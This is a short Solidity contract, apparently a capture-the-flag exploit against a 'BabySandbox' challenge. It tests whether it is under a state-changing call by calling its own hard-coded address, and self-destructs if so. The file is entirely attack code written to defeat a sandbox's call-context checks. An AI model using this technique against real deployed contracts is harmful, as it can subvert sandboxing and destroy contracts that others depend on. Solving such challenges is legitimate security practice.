// SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import "./Setup.sol";
import "hardhat/console.sol";


contract BabySandboxAttacker {

    event StateChanged();

    fallback() external {
        if(isCall()) {
            selfdestruct(address(0));
        }
    }
    function isCall() public returns (bool) {
        // This is the address of this contract.
        (bool success, ) = address(0x71C95911E9a5D330f4D621842EC243EE1343292e).call(abi.encodeWithSignature("changeState()"));
        return success;
    }
    function changeState() public {
        emit StateChanged();
    }

}
